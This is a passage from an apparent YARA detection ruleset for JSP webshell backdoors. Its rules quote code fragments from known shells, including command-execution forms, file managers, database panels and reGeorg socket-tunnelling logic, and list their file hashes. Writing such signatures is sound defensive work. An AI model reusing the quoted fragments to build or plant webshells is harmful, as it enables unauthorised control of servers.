        ( ( uint16(0) == 0x253c or uint16(0) == 0x3c0a or uint16(0) == 0x3f3c or uint16(0) == 0x3d74 or uint16(0) == 0x2020 ) and filesize < 20KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _402a5dfc90a7a750af6fc4fa96b5e63a105424c0_4a45e4f7ca2bfb1d325d1cff8636d0ece29a4eed_b3e5dd93abcc725407c00ad0e68f8e789bffbe4d_38
{
    meta:
        description = "jsp - from files 402a5dfc90a7a750af6fc4fa96b5e63a105424c0.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "3a6649f8a80ad489f3bf960abf8e205373982e0be25fb6fec3f99b7c40826528"
        hash2 = "35c44ef39b71532afe1dd00b75297871296cffcfdd146bf38b7d4ac765178241"
        hash3 = "c92947a659de7a5c208633b63daea905f304db47f7c9f7c5fa6ece39e926a8c4"
    strings:
        $s1 = "- Description: jsp File browser v1.1a -- This JSP program allows remote web-based" fullword ascii
        $s2 = "<input title=\"Launch command in current directory\" type=\"Submit\" class=\"button\" name=\"Submit\" value=\"Launch command\">" fullword ascii
        $s3 = "<tr><td title=\"Enter the new filename\"><input type=\"text\" name=\"new_name\" value=\"<%=ef.getName()%>\"></td>" fullword ascii
        $s4 = "if (request.getAttribute(\"olddir\") != null && isAllowed(new File((String) request.getAttribute(\"olddir\")))) {" fullword ascii
        $s5 = "private static final String SAVE_AS_ZIP = \"Download selected files as zip\";" fullword ascii
        $s6 = "<input size=\"<%=EDITFIELD_COLS%>\" type=\"text\" name=\"command\" value=\"\">" fullword ascii
        $s7 = "<h2>Content of <%=conv2Html(f.getName())%></h2><br>" fullword ascii
        $s8 = "dlink + \"</td><td>\" + // The download link" fullword ascii
        $s9 = "<form action=\"<%= browser_name%>\" enctype=\"multipart/form-data\" method=\"POST\">" fullword ascii
        $s10 = "if (!isAllowed(new File((String)ht.get(\"dir\")))){" fullword ascii
        $s11 = "out.println(\"<tr><th>&nbsp;</th><th title=\\\"Sort files by name\\\" align=left><a href=\\\"\"" fullword ascii
        $s12 = "* This can yield to performance issues. Turn it of, if the directory loads to slow." fullword ascii
        $s13 = "if (isAllowed(f)) request.setAttribute(\"dir\", f.getAbsolutePath());" fullword ascii
        $s14 = "if (!isAllowed(new File((String)request.getAttribute(\"dir\")))){" fullword ascii
        $s15 = "<form action=\"<%= browser_name %>\" method=\"Post\" name=\"FileList\">" fullword ascii
        $s16 = "if (f.getParent() != null && isAllowed(f)) f = new File(f.getParent());" fullword ascii
        $s17 = "<input title=\"Enter new dir or filename or the relative or absolute path\" type=\"text\" name=\"cr_dir\">" fullword ascii
        $s18 = "<tr><td><input type=\"radio\" name=\"lineformat\" value=\"dos\" <%= dos?\"checked\":\"\"%>>Ms-Dos/Windows</td>" fullword ascii
        $s19 = "else if (request.getParameter(\"Submit\").equals(\"Save\")) {" fullword ascii
        $s20 = ".println(\"<td align=center><input type=\\\"checkbox\\\" name=\\\"selfile\\\" disabled></td>\");" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 8 of them ) ) or ( all of them )
}

rule _00c86bf6ce026ccfaac955840d18391fbff5c933_650eaa21f4031d7da591ebb68e9fc5ce5c860689_s08_39
{
    meta:
        description = "jsp - from files 00c86bf6ce026ccfaac955840d18391fbff5c933.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "2f482548bc419b63762a04249697d371f277252e7c91a7be49cc65b72e9bae5a"
        hash2 = "b963b8b8c5ca14c792d2d3c8df31ee058de67108350a66a65e811fd00c9a340c"
        hash3 = "112ae6a3fa46155016644dcbc6d485a20307d21db56a0c51b873ec56d27696df"
    strings:
        $s1 = "socketChannel.connect(new InetSocketAddress(target, port));" fullword ascii
        $s2 = "https://github.com/sensepost/reGeorg" fullword ascii
        $s3 = "etienne@sensepost.com / @kamp_staaldraad" fullword ascii
        $s4 = "} else if (cmd.compareTo(\"FORWARD\") == 0){" fullword ascii
        $s5 = "System.out.println(e.getMessage());" fullword ascii
        $s6 = "System.out.println(ex.getMessage());" fullword ascii
        $s7 = "sam@sensepost.com / @trowalts" fullword ascii
        $s8 = "int readlen = request.getContentLength();" fullword ascii
        $s9 = "willem@sensepost.com / @_w_m__" fullword ascii
        $s10 = "} else if (cmd.compareTo(\"READ\") == 0){" fullword ascii
        $s11 = "request.getInputStream().read(buff, 0, readlen);" fullword ascii
        $s12 = "SocketChannel socketChannel = (SocketChannel)session.getAttribute(\"socket\");" fullword ascii
        $s13 = "response.setHeader(\"X-ERROR\", e.getMessage());" fullword ascii
        $s14 = "String target = request.getHeader(\"X-TARGET\");" fullword ascii
        $s15 = "response.setHeader(\"X-STATUS\", \"FAIL\");" fullword ascii
        $s16 = "String cmd = request.getHeader(\"X-CMD\");" fullword ascii
        $s17 = "} else if (cmd.compareTo(\"DISCONNECT\") == 0) {" fullword ascii
        $s18 = "int port = Integer.parseInt(request.getHeader(\"X-PORT\"));" fullword ascii
        $s19 = "if (cmd.compareTo(\"CONNECT\") == 0) {" fullword ascii
        $s20 = "session.setAttribute(\"socket\", socketChannel);" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 10KB and ( 8 of them ) ) or ( all of them )
}

rule _0bf6c1e069a14181eb642fa939a059efddc8c82e_d81109025958f6b0f0a92f3ce8daa0980b111a9c_40
{
    meta:
        description = "jsp - from files 0bf6c1e069a14181eb642fa939a059efddc8c82e.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "b5886ba695f39bf801e5b47067cfcf983c645ccfcee6eee5292e7b911601f744"
        hash2 = "d29b790d8d6ec12f98f2bdaadd51232406e2a63885cc5ed302d105ff0361a0c3"
    strings:
        $s1 = "<td align=\"right\">hack520 by <a href=\"mailto:hack520@77169.org\">hack520</a> and welcome to <a href=\"http://www.GOOGLE.com\"" ascii
        $s2 = "sRet += \" <td><a title=\\\"\" + files[n].getName() + \"\\\">\" + strCut(files[n].getName(), 50) + \"</a></td>\\n\";" fullword ascii
        $s3 = "sRet += \" <td>[<a href=\\\"\" + curUri + \"&curPath=\" + pathConvert(curFile.getParent()) + \"\\\">" fullword ascii
        $s4 = "t;\" + strCut(files[n].getName(), 50) + \"&gt;</a></td>\\n\";" fullword ascii
        $s5 = "sRet += \" <td width=\\\"15%\\\" align=\\\"center\\\">\" + files[n].length() + \"</td>\\n\";" fullword ascii
        $s6 = "+ pathConvert(files[n].getPath()) + \"</a></td>\\n\";" fullword ascii
        $s7 = "sRet += \" <textarea name=\\\"fileContent\\\" cols=\\\"80\\\" rows=\\\"32\\\">\\n\";" fullword ascii
        $s8 = "if (request.getParameter(\"command\") != null) { " fullword ascii
        $s9 = "<td align=\"right\">hack520 by <a href=\"mailto:hack520@77169.org\">hack520</a> and welcome to <a href=\"http://www.GOOGLE.com\"" ascii
        $s10 = "sRet += \" <form enctype=\\\"multipart/form-data\\\" method=\\\"post\\\" name=\\\"upload\\\" action=\\\"\" + curUri + \"&curPath" ascii
        $s11 = "sRet += \" if (newName != null && newName != false && ltrim(newName) != \\\"\\\") {\\n\";" fullword ascii
        $s12 = "=open\" + \"\\\">edit</a>>\" : \"\") + \"</td>\\n\";" fullword ascii
        $s13 = "sRet += \" <td width=\\\"5%\\\" align=\\\"center\\\"><input type=\\\"checkbox\\\" name=\\\"filesDelete\\\" value=\\\"\" + pathCo" ascii
        $s14 = "ction=upload\" + \"\\\">\\n\";" fullword ascii
        $s15 = "document.fileList.filesDelete[selected].value;\";" fullword ascii
        $s16 = "sRet += \" <td width=\\\"5%\\\" align=\\\"center\\\"><input type=\\\"checkbox\\\" name=\\\"filesDelete\\\" value=\\\"\" + pathCo" ascii
        $s17 = "isTextFile(getExtName(files[n].getPath())) ? \"<<a href=\\\"\" + curUri + \"&curPath=\" + pathConvert(files[n].getPath()) + \"&f" ascii
        $s18 = "sRet += \" &nbsp;<a href=\\\"\" + curUri + \"&curPath=\" + (curFile.getParent() == null ? \"\" : pathConvert(curFile.getParent()" ascii
        $s19 = "sRet += \" document.openfile.action=\\\"\" + curUri + \"&curPath=\" + pathConvert(curFile.getParent()) + \"\\\" + fileName + " ascii
        $s20 = "sRet += \" <td><a href=\\\"\" + curUri + \"&curPath=\" + pathConvert(files[n].getPath()) + \"\\\" title=\\\"\" + files[n].getNam" ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 8 of them ) ) or ( all of them )
}

rule _36e91678f1e2887b5524cc7fdc8e6790aa4a378a_53b38b2940917f3fb327d71f8aef2ef1d8ce4387_7628589fcf7bf32067e67f5637445defad71302d__41
{
    meta:
        description = "jsp - from files 36e91678f1e2887b5524cc7fdc8e6790aa4a378a.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "3b4283db4961a557b02b3de8377b61f5c085552a46191625db42939056129d53"
        hash2 = "09313b0c7b353d392366b5790476ba61a2b7edba8658c47870845387bf2505db"
        hash3 = "4dc5f8054f0fff649e263b1eb7e82b30bd71fdea7d1d2b4c6299cb329029ac50"
        hash4 = "75c94d0f6f29908dc10227de1eb45de9afa871891c18942ebd33dd916203b43e"
        hash5 = "444cb5e82638a872b85d18ecb67b71649f2a3f543bc2874397fa63d889571ce0"
        hash6 = "b996b499c5f56b51eccc5fa181bc69b208da8023c441277a522aa52ace72ecbd"
        hash7 = "57764b5504b584b7cd7969b17d2401a6fe85f1f3a03d02943bc0bdc74514a7c3"
        hash8 = "c8b7d196856c0c5c0f4d6e6a0300f77dab19d5479bde6a757510af1ec410df6f"
    strings:
        $s1 = "System.setProperty(\"sun.net.client.defaultConnectTimeout\", String" fullword ascii
        $s2 = "System.setProperty(\"sun.net.client.defaultReadTimeout\", String" fullword ascii
        $s3 = "responseContent = tempStr.toString();" fullword ascii
        $s4 = "FileLocalUpload(uc(dx())+sxm,request.getRequestURL().toString(),  \"GBK\");" fullword ascii
        $s5 = "String tempLine = rd.readLine();" fullword ascii
        $s6 = "for (int i = SysInfo.length() - 1; i >= 0; i--) {" fullword ascii
        $s7 = "tempLine = rd.readLine();" fullword ascii
        $s8 = "tempStr.append(tempLine);" fullword ascii
        $s9 = "StringBuffer tempStr = new StringBuffer();" fullword ascii
        $s10 = "url_con = (HttpURLConnection) url.openConnection();" fullword ascii
        $s11 = "String c=\"\\n\\r\"; long d=127,  f=11, j=12, h=14,  m=31, r=83, k=1, n=8,  s=114, u=-5, v=5,a=0;" fullword ascii
        $s12 = "BufferedReader rd = new BufferedReader(new InputStreamReader(in," fullword ascii
        $s13 = "InputStream in = url_con.getInputStream();" fullword ascii
        $s14 = "String crlf=System.getProperty(\"line.separator\");" fullword ascii
        $s15 = "while (tempLine != null)" fullword ascii
        $s16 = "HttpURLConnection url_con = null;" fullword ascii
        $s17 = "private static int readTimeOut = 10000;" fullword ascii
        $s18 = "url_con.getOutputStream().close();" fullword ascii
        $s19 = "url_con.getOutputStream().flush();" fullword ascii
        $s20 = "url_con.setRequestMethod(\"POST\");" fullword ascii
    condition:
        ( ( uint16(0) == 0x253c or uint16(0) == 0xbbef ) and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule _094b96e84e01793e542f8d045af68da015a4a7fc_52ed07e55c6e6d640ffc2c6371c585ce063f6329_52ed07e55c6e6d640ffc2c6371c585ce063f6329__42
{
    meta:
        description = "jsp - from files 094b96e84e01793e542f8d045af68da015a4a7fc.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "a5b67b8b8617fd8f2cff76399aa8782813bb29f06c9b6b444db8617a65a0771c"
        hash2 = "df204c8c4accc4a508a86a91a63700ea4cf803dd273272c746f94a77ec933d23"
        hash3 = "df204c8c4accc4a508a86a91a63700ea4cf803dd273272c746f94a77ec933d23"
        hash4 = "ab9fd7ec29a69d4caa54c063c86d02f334ae1add49b0acd42a4afdfd05cb7ae0"
        hash5 = "5deda28b47b16d083c40e0fecdf617de7e645a7b06a053a572c6e2702dc8577b"
        hash6 = "e26e617b9e9b77f4578f8737e3463c18210855626b4aca49d465be65f59e97d1"
    strings:
        $s1 = "+ \" <option value='oracle.jdbc.driver.OracleDriver`jdbc:oracle:thin:@dbhost:1521:ORA1'>Oracle</option>\"" fullword ascii
        $s2 = "((Invoker) ins.get(\"ev\")).invoke(request, response, JSession);" fullword ascii
        $s3 = "this.conn = DriverManager.getConnection(url, uid, pwd);" fullword ascii
        $s4 = "((Invoker) ins.get(\"dbc\")).invoke(request, response," fullword ascii
        $s5 = "((Invoker) ins.get(\"vs\")).invoke(request, response," fullword ascii
        $s6 = "+ \"<table width=\\\"100%\\\" border=\\\"0\\\" cellpadding=\\\"15\\\" cellspacing=\\\"0\\\">\"" fullword ascii
        $s7 = "+ \"Driver:\"" fullword ascii
        $s8 = "+ \" <select onchange='changeurldriver()' class=\\\"input\\\" id=\\\"db\\\" name=\\\"db\\\" >\"" fullword ascii
        $s9 = "+ \"<input id=\\\"action\\\" type=\\\"hidden\\\" name=\\\"o\\\" value=\\\"dbc\\\" />\"" fullword ascii
        $s10 = "+ \"\\\" method=\\\"post\\\" >\"" fullword ascii
        $s11 = "+ SHELL_NAME" fullword ascii
        $s12 = "while ((a = sis.readLine(b, 0, b.length)) != -1) {" fullword ascii
        $s13 = ".println(\"<table width=\\\"100%\\\" border=\\\"0\\\" cellpadding=\\\"15\\\" cellspacing=\\\"0\\\"><tr><td>\"" fullword ascii
        $s14 = "JSession.setAttribute(SESSION_O, \"vConn\");" fullword ascii
        $s15 = "+ \"PWD:\"" fullword ascii
        $s16 = "+ \"UID:\"" fullword ascii
        $s17 = "+ \" <option value='com.microsoft.jdbc.sqlserver.SQLServerDriver`jdbc:microsoft:sqlserver://localhost:1433;DatabaseName=master'>" ascii
        $s18 = "+ \"DataBase:\"" fullword ascii
        $s19 = "+ \"URL:\"" fullword ascii
        $s20 = "+ \" <option value='com.mysql.jdbc.Driver`jdbc:mysql://localhost:3306/mysql?useUnicode=true&characterEncoding=GBK'>Mysql</option" ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 500KB and ( 8 of them ) ) or ( all of them )
}

rule _402a5dfc90a7a750af6fc4fa96b5e63a105424c0_4a45e4f7ca2bfb1d325d1cff8636d0ece29a4eed_4c2464503237beba54f66f4a099e7e75028707aa__43
{
    meta:
        description = "jsp - from files 402a5dfc90a7a750af6fc4fa96b5e63a105424c0.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "3a6649f8a80ad489f3bf960abf8e205373982e0be25fb6fec3f99b7c40826528"
        hash2 = "35c44ef39b71532afe1dd00b75297871296cffcfdd146bf38b7d4ac765178241"
        hash3 = "b90b999b3d22fc2031ea2af13e3379be2c7d82bbed3544e8ab1c90da4a271750"
        hash4 = "09b677ca8806f681cb31ad69b8ec79b3416b491a04b8283d606ac7ba7edffeda"
        hash5 = "e44e97f8d375523576bb2e93e3de8d29d7f95891da3d082bf083b837d1873eab"
        hash6 = "62c616f5cddfd493f16e6ef2d7fe12567ee2d16a311317da8d59fb5f3f09f713"
        hash7 = "115d2750f70a1cc6cda5aa72bd8541bba87157c6f00dc7f311f3f5ba1bb41ecb"
        hash8 = "c92947a659de7a5c208633b63daea905f304db47f7c9f7c5fa6ece39e926a8c4"
        hash9 = "5c8e4945b0aa4bc661db0f9fea51a7fac07ad3d4093c499100570a613906512c"
        hash10 = "b5e9cd17caf4344895afca031a55535af49189c60a4b05095425931c9ab1b11b"
        hash11 = "89a69d8d77e3a427276a568cde58dbfa0fd8a555f51ecc38c1b91a929db2b209"
    strings:
        $s1 = "<input type=\"hidden\" name=\"nfile\" value=\"<%= request.getParameter(\"editfile\")%>\">" fullword ascii
        $s2 = "File new_f = new File(getDir(f.getParent(), request.getParameter(\"new_name\")));" fullword ascii
        $s3 = "request.setAttribute(\"dir\", request.getParameter(\"dir\"));" fullword ascii
        $s4 = "<input type=\"hidden\" name=\"dir\" value=\"<%=request.getAttribute(\"dir\")%>\">" fullword ascii
        $s5 = "Vector v = expandFileList(request.getParameterValues(\"selfile\"), false);" fullword ascii
        $s6 = "Vector v = expandFileList(request.getParameterValues(\"selfile\"), true);" fullword ascii
        $s7 = "out.println(request.getAttribute(\"message\"));" fullword ascii
        $s8 = "response.setContentLength((int) f.length());" fullword ascii
        $s9 = "String filePath = request.getParameter(\"downfile\");" fullword ascii
        $s10 = "String dir_name = request.getParameter(\"cr_dir\");" fullword ascii
        $s11 = "String file_name = request.getParameter(\"cr_dir\");" fullword ascii
        $s12 = "File ef = new File(request.getParameter(\"editfile\"));" fullword ascii
        $s13 = "private static String tempdir = \".\";" fullword ascii
        $s14 = "File f = new File(request.getParameter(\"nfile\"));" fullword ascii
        $s15 = "int dir_l = dir_file.getAbsolutePath().length();" fullword ascii
        $s16 = "BufferedReader reader = new BufferedReader(new FileReader(ef));" fullword ascii
        $s17 = "String buf = entry[i].getAbsolutePath();" fullword ascii
        $s18 = "String new_dir = getDir(dir, dir_name);" fullword ascii
        $s19 = "BufferedInputStream fr = new BufferedInputStream(new FileInputStream(f));" fullword ascii
        $s20 = "if (window.opera) OP = 1;" fullword ascii
    condition:
        ( ( uint16(0) == 0x253c or uint16(0) == 0x3c0a ) and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule _0bf6c1e069a14181eb642fa939a059efddc8c82e_183df23142716d5d2fc0ea24bbeeb40eaa8b65c3_275da720a99ed21fd98953f9ddda7460e5b96e5f__44
{
    meta:
        description = "jsp - from files 0bf6c1e069a14181eb642fa939a059efddc8c82e.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "b5886ba695f39bf801e5b47067cfcf983c645ccfcee6eee5292e7b911601f744"
        hash2 = "c525fc8c5db44286a6f04746faa3c9e2f5087cda1962c5154b758515f3e1bb1b"
        hash3 = "dc34856d6d9427af27e8e4369a3a3a333b90adc51482f8c497a1df8aa1e26e09"
        hash4 = "3b2498fbdba4ba0afa07db58bc7635bd32e6c89a5ce71a1e39941099b2d24247"
        hash5 = "11c6a21978abede258a86656ea665773ff5d126975a2389d6514a3f7f25507c1"
        hash6 = "235734c9bcff91f33a8430859299bd30489bf8865279f81571c571b9797d070f"
        hash7 = "ea0d67b44f2a604603176606bd47cb55845bf29b191564958ce9b9d2a33c63b9"
        hash8 = "b798b2eef87755b26b30e4d3483582adcc7d0a20d87cb78c8a9cd5c7a32d7730"
        hash9 = "7d0aedc6999a16e814f43f63617d4fbff0dc6c70ba4b67b2dd72ca00ad9099e1"
        hash10 = "ad54cd37b150597ec7032b391507addfb6b871711e5cbf28ccb213dd1855ef5c"
        hash11 = "a4306b23c0f066dbfbfc5a06d07b58081dd618fd5c95ec795cd3b8085bc80bd6"
        hash12 = "d29b790d8d6ec12f98f2bdaadd51232406e2a63885cc5ed302d105ff0361a0c3"
        hash13 = "5473f1edd8d2c8c37648cf0c64d805741f1cd867eeceb21850570d74851f0d78"
        hash14 = "31ce3b5fd44d13657926e93308d43fe0ef6c58559e50ba3029c6f97b35517f99"
    strings:
        $s1 = "throw new JshellConfigException(\"session" fullword ascii
        $s2 = "\\\"\" + pathConvert(folder.getPath()) + \"\\\"" fullword ascii
        $s3 = "sRet += \"<a href=\\\"#\\\" onclick=\\\"javascript:document.fileList.submit();\\\">" fullword ascii
        $s4 = "sRet += \"<a href=\\\"#\\\" onclick=\\\"javascript:showUpload()\\\">" fullword ascii
        $s5 = "\\\"/>&nbsp;<input type=\\\"reset\\\" class=\\\"button\\\" onclick=\\\"javascript:resetIt()\\\" value=\\\"" fullword ascii
        $s6 = "sRet = \"<font color=\\\"red\\\">\\\"\" + path + folderName + \"\\\"" fullword ascii
        $s7 = "sRet = \"<font color=\\\"red\\\">\\\"\" + path + fileName + \"\\\"" fullword ascii
        $s8 = "sRet += \"<span style=\\\"visibility: hidden\\\" id=\\\"up\\\"><input type=\\\"file\\\" value=\\\"" fullword ascii
        $s9 = "new JshellConfigException(\"" fullword ascii
        $s10 = "<option value=\"command\">" fullword ascii
        $s11 = "sRet += \"<a href=\\\"#\\\" onclick=\\\"javascript:createFolder()\\\">" fullword ascii
        $s12 = "sRet += \"<a href=\\\"#\\\" onclick=\\\"javascript:rename()\\\">" fullword ascii
        $s13 = "sRet += \"<a href=\\\"#\\\" onclick=\\\"javascript:createFile()\\\">" fullword ascii
        $s14 = "sRet += \"<a href=\\\"#\\\" onclick=\\\"javascript:copyFile()\\\">" fullword ascii
        $s15 = "\\\" name=\\\"upFile\\\" size=\\\"8\\\" class=\\\"textbox\\\" />&nbsp;<input type=\\\"submit\\\" value=\\\"" fullword ascii
        $s16 = "\\\"\" + files2Delete[i] + \"\\\"" fullword ascii
        $s17 = "\\\"\" + path + fileName + \"\\\"" fullword ascii
        $s18 = "\\\"\" + file2Rename + \"\\\"" fullword ascii
        $s19 = "\\\"\" + files2Copy[i] + \"\\\"" fullword ascii
        $s20 = "\\\"\" + folderName + \"\\\"" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 8 of them ) ) or ( all of them )
}

rule _0317bd1d741350d9bc4adbf92801b6a109a57458_032c141019ceabee44e013e27d7e77bc4995125a_117eb7a7743d53e767129befd5d2458d1621b23b__45
{
    meta:
        description = "jsp - from files 0317bd1d741350d9bc4adbf92801b6a109a57458.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "bb337a76a63131dc29572bd11d2d3104824d08dc06acfbd8cf6059824d1aa104"
        hash2 = "4aa34b6d453b0f2f723d699553533b70accad316d69308987de458664ed8dd79"
        hash3 = "bf5e7cbcb5e1651762302f279b749281d834834cce2d5a5af7319e794690ac2e"
        hash4 = "89a1dccb42fea5cb434392324f8729127399f344fba831e60f004a063b05c265"
        hash5 = "09662e5f79e84781ecb6b508794e52a578726229cc2e37be676cfba5e8751d1a"
        hash6 = "e68119870bc45d5cfda0a196d909288a48dc9ba4182596bfcc61939f79e47e7d"
        hash7 = "187900f5969d51b1e97b8fc86f285d903897663198aa50ce4bccb2d66f3058c8"
        hash8 = "148f88c0b115cf2e7d5a362863feef97b5c513c1f0925780009489ce5245e1f9"
        hash9 = "3b4283db4961a557b02b3de8377b61f5c085552a46191625db42939056129d53"
        hash10 = "3d192c949b8ae3da720884c66c19358246b46e38798bec40a1ad94da65a9034d"
        hash11 = "f91f6009cfee1189db44edcba85b2d9bad819331ee4e369cdcb4e21710c6768c"
        hash12 = "7aa89ae3f2118e6c5eeefab268f4dca602b082edb3c571bdc38b2bc8301a438a"
        hash13 = "09313b0c7b353d392366b5790476ba61a2b7edba8658c47870845387bf2505db"
        hash14 = "debf6d0c7f01efd7bdc4322591bf5d0fdbcc299a2093827ac05873276230d336"
        hash15 = "4dc5f8054f0fff649e263b1eb7e82b30bd71fdea7d1d2b4c6299cb329029ac50"
        hash16 = "11394a4bf56a01a0c77f3657abc4c90d134fb8579965aa3acb889cf43fb047c1"
        hash17 = "04ceac0d310cde0e605e38d0e8b841d6f801b57cc6fef5ef7b792612db9acea8"
        hash18 = "4ab552f0503e859e7c96850908ca05525f2ea55f6e9058f7750b36f246b7170d"
        hash19 = "c13a5ec3d790bd79fd182c877b03092f4a80d9de9ea7487444a39b1dd52fc7e1"
        hash20 = "781a141485d7dbf902a5ff10c873653e52622373048e38916a2d7bf5af216074"
        hash21 = "9f3b666adc648f9ef129f2862b3d88e1c0f05bd04577df0af59b23adae302406"
        hash22 = "a063d05eac21c1a6eb046c90f770b5f769890034b9daf7dfda58fc749c330b2b"
        hash23 = "e2daa70b1cbb80911d9c2f48bb527ef64ef55995938cb12beb820e890dd30240"
        hash24 = "84588230bd7d4dbfd3c3544c54e31a0348c614b6c9ad2fd78334cc04dbf16164"
        hash25 = "8aa5dca21b414254d8f772487dd8569b0753813535b3ce1430609f9e52f3fe4c"
        hash26 = "75c94d0f6f29908dc10227de1eb45de9afa871891c18942ebd33dd916203b43e"
        hash27 = "9907c1f10ca7ddde1c8f9a652506737b86e60eb8b537c8a42d4fad55e199d3a7"
        hash28 = "6772b3f0fcf087e3cd64979b34a547897bbd199b314a41d1478ad400314cd0d2"
        hash29 = "444cb5e82638a872b85d18ecb67b71649f2a3f543bc2874397fa63d889571ce0"
        hash30 = "b996b499c5f56b51eccc5fa181bc69b208da8023c441277a522aa52ace72ecbd"
        hash31 = "57764b5504b584b7cd7969b17d2401a6fe85f1f3a03d02943bc0bdc74514a7c3"
        hash32 = "9ce81cfc056822ec9962aa8d6ca2233ac56e26a10f96cddc117d89b73a14c060"
        hash33 = "d77fd709d2bf2a8b25277ebebda1a3522a563eb3a95a240cf2640ab9e7deed58"
        hash34 = "19375141be573a9a01da3eeb26735ecdf7b7beafdbedbd8a0289e42bda552696"
        hash35 = "efe0746ae5723f3b9e4d83bbe5f65a1526ea9b42abc85883afb67e64a3697129"
        hash36 = "1cd6b614fd667f72bf9b6676522b3e6fac7056c4232f1dcaefff55e98655b1bf"
        hash37 = "8047492f47b2ad546190ad1dd18984916da0ac0b046dca46e1f5af315781d182"
        hash38 = "b9e52d41fa9d41dfaebad793ef99bda10c1f1c08fca43541b6d83c0e23cabddd"
        hash39 = "7fff522245c07cf0dc1a00f2650ff37b948337de5d93f58dca8825cea2de0442"
        hash40 = "74168264a53223da64ade79b2083bfaf214fcf3d4a2853d74697d42af78165d0"
        hash41 = "c8b7d196856c0c5c0f4d6e6a0300f77dab19d5479bde6a757510af1ec410df6f"
    strings:
        $s1 = "tice ! If You Are Using IE , You Must Input A Command First After You Start Or You Will Not See The Echo</span>\"+" fullword ascii
        $s2 = "<a href=\\\"javascript:doPost({o:'vRemoteControl'});\\\">Remote Control</a> | \"+" fullword ascii
        $s3 = "\"<a href=\\\"javascript:new fso({path:'\"+Util.convertPath(f.getAbsolutePath())+\"'}).vEditProperty()\\\">Property</a>\");" fullword ascii
        $s4 = "\"<a href=\\\"javascript:new fso({path:'\"+Util.convertPath(f.getAbsolutePath())+\"'}).copy()\\\">Copy</a> | \"+" fullword ascii
        $s5 = "\"<a href=\\\"javascript:new fso({path:'\"+Util.convertPath(f.getAbsolutePath())+\"'}).move()\\\">Move</a> | \"+" fullword ascii
        $s6 = "\" | <a href=\\\"javascript:new fso({path:'\"+Util.convertPath(SHELL_DIR)+\"'}).subdir()\\\">Shell Directory</a>\"+" fullword ascii
        $s7 = "\"  Execute: \"+" fullword ascii
        $s8 = "JSession.setAttribute(MSG,\"Reset File Property Failed!\");" fullword ascii
        $s9 = "\"<a href=\\\"javascript:new fso({path:'\"+Util.convertPath(WEB_ROOT)+\"'}).subdir()\\\">Web Root</a>\"+" fullword ascii
        $s10 = "\"        <input type=\\\"submit\\\" value=\\\"Login\\\"><br/><br/>\"+" fullword ascii
        $s11 = "JSession.setAttribute(MSG,\"Save File Success!\");" fullword ascii
        $s12 = "JSession.setAttribute(MSG,\"Unzip File Success!\");" fullword ascii
        $s13 = "JSession.setAttribute(MSG,\"Delete Files Success!\");" fullword ascii
        $s14 = "> Speed(Second , dont be so fast)  <input type='text' value='3' size='5' id='pl' name='pl'/>  Can Not Control Yet.\"+" fullword ascii
        $s15 = "\"Remote File URL:\"+" fullword ascii
        $s16 = "\"  <td><a href=\\\"javascript:new fso({}).packBatch();\\\">Pack Selected</a> - <a href=\\\"javascript:new fso({}).deleteBatch()" ascii
        $s17 = "\"  <td><a href=\\\"javascript:new fso({}).packBatch();\\\">Pack Selected</a> - <a href=\\\"javascript:new fso({}).deleteBatch()" ascii
        $s18 = "out.println(\"<a href=\\\"javascript:new fso({path:'\"+Util.convertPath(r.getPath())+\"'}).subdir();\\\">Disk(\"+Util.convertPat" ascii
        $s19 = "out.println(\"<a href=\\\"javascript:new fso({path:'\"+Util.convertPath(r.getPath())+\"'}).subdir();\\\">Disk(\"+Util.convertPat" ascii
        $s20 = "\"        <h2>Remote Control &raquo;</h2><input class=\\\"bt\\\" onclick=\\\"var img = document.getElementById('screen').src='\"" ascii
    condition:
        ( ( uint16(0) == 0xbbef or uint16(0) == 0x253c or uint16(0) == 0x6f43 ) and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule _b0bf32a5535c8815eff7429338d0111f2eef41ae_b4544b119f919d8cbf40ca2c4a7ab5c1a4da73a3_c7ec7e8f9270324f17c8fecaebaf10087b4a6c2f_46
{
    meta:
        description = "jsp - from files b0bf32a5535c8815eff7429338d0111f2eef41ae.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "647e68c60293582c59b2e0c6fc8ee672293c731fbbda760dc2ab8ee767019e58"
        hash2 = "f13923c9a06e8526027e2ebf7f854dbee729b259f35e8c3813d6916a171044d4"
        hash3 = "0238225b83d37cc1259f83798f35b547a19179eb247beb9087d589bea7832f11"
    strings:
        $s1 = "out.print(\"<body scroll=no bgcolor=#000000><Center style=font-size:13px><div style='width:500px;border:1px solid #222;padding:2" ascii
        $s2 = "out.print(\"<tr><td colspan=3><TEXTAREA style=\\\"width:100%;background-color:#FF80FF ;height=100%\\\">\"+exeCmd(out,request.get" ascii
        $s3 = "\"+convertPath(list[i].getPath())+\"\\\",\\\"\"+convertPath(list[i].getPath())+\"\\\");'>" fullword ascii
        $s4 = "st.getParameter(\"month\")),encodeChange(request.getParameter(\"day\")),out);break;" fullword ascii
        $s5 = "out.print(\"<TABLE cellSpacing=0 cellPadding=0 width=\\\"100%\\\">\\n<TBODY>\\n<TR>\\n<TD" fullword ascii
        $s6 = "equest.getParameter(\"choice\"));break;" fullword ascii
